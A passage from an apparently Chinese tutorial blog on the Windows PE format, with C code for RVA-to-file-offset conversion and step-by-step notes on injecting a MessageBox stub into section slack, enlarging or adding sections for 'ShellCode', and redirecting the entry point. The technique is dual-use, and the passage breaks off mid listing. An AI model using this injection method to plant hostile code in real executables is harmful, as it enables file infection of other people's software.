MemOffset); </span><br><span class=\"line\">\tint NumOfSec = 0;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD thisVA = 0;</span><br><span class=\"line\">\tDWORD thisFile = 0;</span><br><span class=\"line\">\twhile (pFileHeader-&gt;NumberOfSections &gt; 0)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif ((DWORD)MemOffset &gt; (DWORD)pSectionHeader-&gt;VirtualAddress &amp;&amp; (DWORD)MemOffset &lt; (DWORD)pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tthisVA = pSectionHeader-&gt;VirtualAddress;</span><br><span class=\"line\">\t\t\tthisFile = pSectionHeader-&gt;PointerToRawData;</span><br><span class=\"line\">\t\t\tprintf(&quot;thisVA:%X\\n&quot;,thisVA);  //C000</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class=\"line\">\t\tpFileHeader-&gt;NumberOfSections--;</span><br><span class=\"line\">\t\tNumOfSec++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;NumOfSec:%d\\n&quot;, NumOfSec+1);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD thisoffset = MemOffset - thisVA; //C234-C000 = 234;</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;thisoffset:%X\\n&quot;,thisoffset);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD FilePos = thisoffset + thisFile; // 234 + AC00 = AE34</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;FilePos:%X\\n&quot;,FilePos);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn FilePos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//char* FilePath = &quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;;</span><br><span class=\"line\">\tchar* FilePath = &quot;C:\\\\Users\\\\shinya\\\\Desktop\\\\Unpacker.exe&quot;;</span><br><span class=\"line\">\tLPVOID pFileBuffer = (LPVOID)OpenFile(FilePath);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//ResolvePEHeader(pFileBuffer, FilePath);</span><br><span class=\"line\">\tRvaToFileOffset(pFileBuffer, FilePath,((DWORD)pFileBuffer+0x19543));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230303212608618.png\" alt=\"image-20230303212608618\"></p>\n<h3 id=\"代码节空白区添加代码\"><a class=\"markdownIt-Anchor\" href=\"#代码节空白区添加代码\">#</a> 代码节空白区添加代码</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">12:       MessageBox(0,0,0,0);</span><br><span class=\"line\">004011A8 8B F4                mov         esi,esp</span><br><span class=\"line\">004011AA 6A 00                push        0</span><br><span class=\"line\">004011AC 6A 00                push        0</span><br><span class=\"line\">004011AE 6A 00                push        0</span><br><span class=\"line\">004011B0 6A 00                push        0</span><br><span class=\"line\">004011B2 FF 15 E4 F2 43 00    call        dword ptr [__imp__MessageBoxA@16 (0043f2e4)]</span><br><span class=\"line\"></span><br><span class=\"line\">75EBFD1E 8B FF                mov         edi,edi</span><br><span class=\"line\">75EBFD20 55                   push        ebp</span><br><span class=\"line\">75EBFD21 8B EC                mov         ebp,esp</span><br><span class=\"line\">75EBFD23 6A 00                push        0</span><br><span class=\"line\">75EBFD25 FF 75 14             push        dword ptr [ebp+14h]</span><br><span class=\"line\">75EBFD28 FF 75 10             push        dword ptr [ebp+10h]</span><br><span class=\"line\">75EBFD2B FF 75 0C             push        dword ptr [ebp+0Ch]</span><br><span class=\"line\">75EBFD2E FF 75 08             push        dword ptr [ebp+8]</span><br><span class=\"line\">75EBFD31 E8 A0 FF FF FF       call        75EBFCD6</span><br><span class=\"line\">75EBFD36 5D                   pop         ebp</span><br><span class=\"line\">75EBFD37 C2 10 00             ret         10h</span><br><span class=\"line\"></span><br><span class=\"line\">call E8</span><br><span class=\"line\">jmp E9</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">7650FD1E &gt;  8BFF            mov     edi,edi</span><br><span class=\"line\">7650FD20    55              push    ebp</span><br><span class=\"line\">7650FD21    8BEC            mov     ebp,esp</span><br><span class=\"line\">7650FD23    6A 00           push    0x0</span><br><span class=\"line\">7650FD25    FF75 14         push    dword ptr ss:[ebp+0x14]</span><br><span class=\"line\">7650FD28    FF75 10         push    dword ptr ss:[ebp+0x10]</span><br><span class=\"line\">7650FD2B    FF75 0C         push    dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">7650FD2E    FF75 08         push    dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">7650FD31    E8 A0FFFFFF     call    MessageBoxExA</span><br><span class=\"line\">7650FD36    5D              pop     ebp</span><br><span class=\"line\">7650FD37    C2 1000         retn    0x10</span><br><span class=\"line\"></span><br><span class=\"line\">760634D0 &lt;user32.MessageB | 8BFF                        | mov edi,edi                           |</span><br><span class=\"line\">760634D2                  | 55                          | push ebp                              |</span><br><span class=\"line\">760634D3                  | 8BEC                        | mov ebp,esp                           |</span><br><span class=\"line\">760634D5                  | 833D 948C0876 00            | cmp dword ptr ds:[76088C94],0         |</span><br><span class=\"line\">760634DC                  | 74 22                       | je user32.76063500                    |</span><br><span class=\"line\">760634DE                  | 64:A1 18000000              | mov eax,dword ptr fs:[18]             |</span><br><span class=\"line\">760634E4                  | BA 9C910876                 | mov edx,user32.7608919C               |</span><br><span class=\"line\">760634E9                  | 8B48 24                     | mov ecx,dword ptr ds:[eax+24]         |</span><br><span class=\"line\">760634EC                  | 33C0                        | xor eax,eax                           |</span><br><span class=\"line\">760634EE                  | F0:0FB10A                   | lock cmpxchg dword ptr ds:[edx],ecx   |</span><br><span class=\"line\">760634F2                  | 85C0                        | test eax,eax                          |</span><br><span class=\"line\">760634F4                  | 75 0A                       | jne user32.76063500                   |</span><br><span class=\"line\">760634F6                  | C705 008D0876 01000000      | mov dword ptr ds:[76088D00],1         |</span><br><span class=\"line\">76063500                  | 6A FF                       | push FFFFFFFF                         |</span><br><span class=\"line\">76063502                  | 6A 00                       | push 0                                |</span><br><span class=\"line\">76063504                  | FF75 14                     | push dword ptr ss:[ebp+14]            |</span><br><span class=\"line\">76063507                  | FF75 10                     | push dword ptr ss:[ebp+10]            |</span><br><span class=\"line\">7606350A                  | FF75 0C                     | push dword ptr ss:[ebp+C]             |</span><br><span class=\"line\">7606350D                  | FF75 08                     | push dword ptr ss:[ebp+8]             |</span><br><span class=\"line\">76063510                  | E8 3B020000                 | call &lt;user32.MessageBoxTimeoutA&gt;      |</span><br><span class=\"line\">76063515                  | 5D                          | pop ebp                               |</span><br><span class=\"line\">76063516                  | C2 1000                     | ret 10                                |</span><br><span class=\"line\"></span><br><span class=\"line\">E8 3B020000                 | call &lt;user32.MessageBoxTimeoutA&gt;</span><br><span class=\"line\">E9 ????????\t\t\t\t\t| jmp ????????</span><br><span class=\"line\"></span><br><span class=\"line\">跳转的地址 = E8这条指令下一行地址 + X\t\t\t\t\t  X =  跳转的地址 - E8这条指令下一行地址</span><br><span class=\"line\">跳转的地址 = E8当前的地址 + 5 + X\t\t\t\t\t\tX = 跳转的地址 - （E8的地址 + 5）</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">6A 00 6A 00 6A 00 6A 00 E8 00 00 00 00 E9 00 00 00 00</span><br><span class=\"line\"></span><br><span class=\"line\">ImageBase = 400000</span><br><span class=\"line\">400000 + 10D4F = 410D4F</span><br><span class=\"line\">410D4F-411b02</span><br><span class=\"line\">760634D0 - 411afd</span><br><span class=\"line\">11af0</span><br><span class=\"line\"></span><br><span class=\"line\">1.将节中多余部分改写为6A 00 6A 00 6A 00 6A 00 E8 00 00 00 00 E9 00 00 00 00</span><br><span class=\"line\">2.计算E8 和 E9之后的地址</span><br><span class=\"line\">跳转的地址 = E8这条指令下一行地址 + X</span><br><span class=\"line\">E8 = 760634D0 - 411afd     (411afd为E9的地址，就是E8的下一条地址)</span><br><span class=\"line\">E9 = 410D4F - 411b02       (imagebase+OEP)-(imagebase+E9下一条地址)</span><br><span class=\"line\">3.更改OEP为我们代码开始的地址 ，不需要加imagebase</span><br><span class=\"line\"></span><br><span class=\"line\">程序开始时先执行我们的代码，执行结束后在由我们写的jmp跳转到OEP，执行正常的程序</span><br><span class=\"line\">MessageBox  = 76E534D0</span><br><span class=\"line\">E9 = 11afd</span><br><span class=\"line\">76E534D0 - (400000+11afd) = 76A419D3</span><br><span class=\"line\">E9-&gt;next = 11b02</span><br><span class=\"line\">410D4F - 411b02</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MessageBox = 75BDFD1E</span><br><span class=\"line\">E9 = b5fd</span><br><span class=\"line\">75BDFD1E - 100b5fd = 74BD 4721</span><br><span class=\"line\">E9-&gt;next = b602</span><br><span class=\"line\">3689 - b602 =FFFF 8087</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">创建新节</span><br><span class=\"line\">1.新增一个节</span><br><span class=\"line\">2.在新节后面填充一个节大小的00</span><br><span class=\"line\">3.修改PE头中节的数量</span><br><span class=\"line\">4.修改sizeofimage</span><br><span class=\"line\">5.原有数据后新增内存对齐整数倍的一个节</span><br><span class=\"line\">6.修改节表</span><br><span class=\"line\"></span><br><span class=\"line\">notepad中节表后面存在非零的有用数据，所以需要把nt，file，option，节表提升抬升，提升到垃圾数据中</span><br><span class=\"line\"></span><br><span class=\"line\">如果提升也不能用就需要扩大节，只能扩大最后一个节</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">扩大节</span><br><span class=\"line\">1.拉伸到内存 -&gt; filebuffer -&gt; imagebuffer</span><br><span class=\"line\">2.分配一块显得空间,newimagebuffer，大小为 sizeofimage + x</span><br><span class=\"line\">3.将最后一个接的sizeofrawdata和virtualsize 改为N     N=内存对齐后尺寸+新增大小</span><br><span class=\"line\">3.修改sizeofimage大小</span><br><span class=\"line\">扩大节：</span><br><span class=\"line\"></span><br><span class=\"line\">1、拉伸到内存（只是逻辑上，实际代码操作并不需要这一步），需要注入的代码为 ShellCode</span><br><span class=\"line\"></span><br><span class=\"line\">2、分配一块新的空间：SizeOfImage + sizeof ( ShellCode)</span><br><span class=\"line\"></span><br><span class=\"line\">3、扩大节，修改最后一个节的 SizeOfRawData 和 VirtualSize</span><br><span class=\"line\"></span><br><span class=\"line\">   OrgSecSize = max ( SizeOfRawData 或 VirtualSize内存对齐后的值 ) </span><br><span class=\"line\"></span><br><span class=\"line\">   ∵ 有些初始化数据未全部写入文件，VirtualSize 可能比 SizeOfRawData 大，必须保证添加的代码不影响到原程序</span><br><span class=\"line\"></span><br><span class=\"line\">   VirtualSize = OrgSecSize + sizeof ( ShellCode)</span><br><span class=\"line\"></span><br><span class=\"line\">   SizeOfRawData = ( OrgSecSize + sizeof(ShellCode) ) 按文件对齐后的值</span><br><span class=\"line\"></span><br><span class=\"line\">4、修改SizeOfImage大小</span><br><span class=\"line\"></span><br><span class=\"line\">   SizeOfImage = (最后一节 VirtualAddress + VirtualSize) 按内存对齐后的值</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">合并节 可以节省节表</span><br><span class=\"line\">0.拉伸到内存 </span><br><span class=\"line\">1.修改sectionnumber</span><br><span class=\"line\">2.将第一个节内存大小，文件大小改成一样</span><br><span class=\"line\">VirtualSize=sizeofrawdata=sizeofimage-virtualaddress[0]=VA[-1]+max&#123;sizeofraw,VSize&#125;-headers(内存对齐后)</span><br><span class=\"line\">3.virtualaddress不改  pointertorawdata 不改</span><br><span class=\"line\">4.该属性</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">扩大最后一个节</span><br><span class=\"line\">合并所有节</span><br><span class=\"line\">输出全部目录</span><br><span class=\"line\">返回对齐后大小 Align(int x, int y);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230307192218718.png\" alt=\"image-20230307192218718\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">image_directory </span><br><span class=\"line\">记录编译器生成的数据在哪里</span><br><span class=\"line\"></span><br><span class=\"line\">#define IIAGE_NUMBEROF_DIRECTORY_ENTRIES 16</span><br><span class=\"line\">分别是:导出表、导入表、资源表、异常信息表、安全证书表、重定位表、调试信息表、版权所以表、全局指针表TLS表、加载配置表、绑定导入表、IAT表、延迟导入表、COM信息表最后一个保留未使用。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span 